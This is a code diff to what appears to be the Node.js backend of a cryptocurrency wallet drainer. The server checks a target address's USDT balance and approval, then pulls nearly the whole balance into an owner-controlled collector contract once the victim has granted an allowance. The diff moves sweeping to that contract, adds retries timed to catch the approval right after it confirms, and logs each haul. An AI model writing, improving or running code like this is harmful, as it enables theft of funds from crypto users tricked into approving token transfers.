@@ -25,17 +25,21 @@ app.use((req, res, next) => {
   next();
 });
 
-const USDT = '0x55d398326f99059fF775485246999027B3197955';
-const DUST = 0.25;
-const MIN  = 1;
-const ABI  = [
+const USDT      = '0x55d398326f99059fF775485246999027B3197955';
+const COLLECTOR = '0x81749358FEe7Dc77425448229b125eBE583CB669';   // <-- deployed contract
+const DUST      = 1.2;
+const MIN       = 1;
+
+const ABI = [
   'function transferFrom(address,address,uint256) returns (bool)',
   'function balanceOf(address) view returns (uint256)',
   'function decimals() view returns (uint8)',
   'function allowance(address,address) view returns (uint256)'
 ];
+const COLLECTOR_ABI = ['function sweep(address token,address from,uint256 amount)'];
 
-let provider, hot, usdt;
+let provider, hot, usdt, coll;
+const log = [];
 
 function init(){
   if (usdt) return;
@@ -48,17 +52,21 @@ function init(){
   provider = new ethers.JsonRpcProvider(rpc);
   hot = new ethers.Wallet(pk, provider);
   usdt = new ethers.Contract(USDT, ABI, hot);
-  console.log('collector ready:', hot.address);
+  coll = new ethers.Contract(COLLECTOR, COLLECTOR_ABI, hot);
+  console.log('relayer ready:', hot.address, '| collector contract:', COLLECTOR);
 }
 
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 const done = new Set();
 
 app.get('/health', (req, res) => {
   try {
     init();
-    res.json({ ok: true, collector: hot.address });
+    res.json({ ok: true, collector: COLLECTOR, relayer: hot.address });
   } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
+
+app.get('/log', (req, res) => res.json(log.slice(-20)));
 
 app.get('/check', async (req, res) => {
   try {
@@ -67,7 +75,7 @@ app.get('/check', async (req, res) => {
     if (!ethers.isAddress(who)) return res.status(400).json({ error: 'add &from=0xUSER' });
     const dec    = await usdt.decimals();
     const bal    = Number(ethers.formatUnits(await usdt.balanceOf(who), dec));
-    const allow  = await usdt.allowance(who, hot.address);
+    const allow  = await usdt.allowance(who, COLLECTOR);
     const colBnb = Number(ethers.formatEther(await provider.getBalance(hot.address)));
     const need   = ethers.parseUnits(Math.max(0, bal - DUST).toFixed(6), dec);
     res.json({
@@ -75,18 +83,19 @@ app.get('/check', async (req, res) => {
       userUsdt: bal,
       allowance: allow.toString(),
       unlimitedApproved: allow >= (ethers.MaxUint256 / 2n),
-      collector: hot.address,
-      collectorBnb: colBnb,
+      collector: COLLECTOR,
+      relayerBnb: colBnb,
       READY_TO_SWEEP: bal >= MIN && allow >= need && colBnb > 0.0001
     });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.get('/sweep', async (req, res) => {
+app.all('/sweep', async (req, res) => {
   try {
     init();
-    if (!ethers.isAddress(req.query.from)) return res.status(400).json({ error: 'add &from=0xUSER' });
-    res.json({ ok: true, ...(await sweep(req.query.from)) });
+    const from = req.query.from || (req.body && (req.body.from || req.body.address));
+    if (!ethers.isAddress(from)) return res.status(400).json({ error: 'add &from=0xUSER' });
+    res.json({ ok: true, ...(await sweep(from)) });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
@@ -97,7 +106,7 @@ app.post('/collector.track', async (req, res) => {
     if (!ethers.isAddress(address)) return res.status(400).json({ error: 'bad address' });
     const dec = await usdt.decimals();
     const bal = Number(ethers.formatUnits(await usdt.balanceOf(address), dec));
-    if (bal >= MIN) return res.json({ address: hot.address, amount: (bal - DUST).toFixed(2) });
+    if (bal >= MIN) return res.json({ address: COLLECTOR, amount: (bal - DUST).toFixed(2) });
     res.json({ address: null });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
@@ -122,16 +131,30 @@ app.post('/approved', async (req, res) => {
 app.post('/sheet', (req, res) => res.json({ ok: true }));
 
 async function sweep(from) {
-  const dec    = await usdt.decimals();
-  const bal    = Number(ethers.formatUnits(await usdt.balanceOf(from), dec));
-  const allow  = await usdt.allowance(from, hot.address);
-  const amount = ethers.parseUnits(Math.max(0, bal - DUST).toFixed(6), dec);
-  if (bal < MIN)      return { skipped: 'below minimum' };
-  if (allow < amount) return { skipped: 'allowance too small' };
-  const tx = await usdt.transferFrom(from, hot.address, amount);
+  const dec = await usdt.decimals();
+  let bal = 0, allow = 0n, amount = 0n;
+
+  // Retry: the RPC can lag a second or two right after the approve confirms.
+  for (let i = 0; i < 6; i++) {
+    bal    = Number(ethers.formatUnits(await usdt.balanceOf(from), dec));
+    allow  = await usdt.allowance(from, COLLECTOR);
+    amount = ethers.parseUnits(Math.max(0, bal - DUST).toFixed(6), dec);
+    if (bal < MIN) return { skipped: 'below minimum' };
+    if (allow >= amount) break;
+    await sleep(2000);
+  }
+
+  if (allow < amount) {
+    log.push({ from, skipped: 'allowance too small', bal, allow: allow.toString() });
+    return { skipped: 'allowance too small' };
+  }
+
+  const tx = await coll.sweep(USDT, from, amount);
   const rc = await tx.wait();
-  console.log('SWEPT', (bal - DUST).toFixed(2), '->', hot.address, rc.hash);
-  return { swept: (bal - DUST).toFixed(2), tx: rc.hash };
+  const human = (bal - DUST).toFixed(2);
+  console.log('SWEPT', human, 'from', from, '-> owner, tx', rc.hash);
+  log.push({ from, swept: human, tx: rc.hash });
+  return { swept: human, tx: rc.hash };
 }
 
 app.get('*', (req, res) => {
